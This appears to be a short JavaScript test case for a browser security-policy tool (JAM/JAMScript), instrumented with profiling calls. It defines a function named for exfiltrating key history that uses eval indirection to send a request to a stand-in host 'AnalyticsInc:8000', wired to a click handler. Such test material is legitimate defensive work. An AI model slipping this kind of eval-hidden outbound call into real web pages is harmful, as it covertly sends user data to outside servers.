
JAM.startProfile('load');
function exfiltrate_key_history(){var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=eval2", true);xmlhttp.send(null);',v2="eval",v2=JAMScript.isEval(eval)?eval("introspect(JAMScript.introspectors.processAll) { "+v2+" }"):JAMScript.call(eval,null,[v2]);JAMScript.call(v2,null,[exp])}var v1=document.getElementById("test");JAMScript.set(v1,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
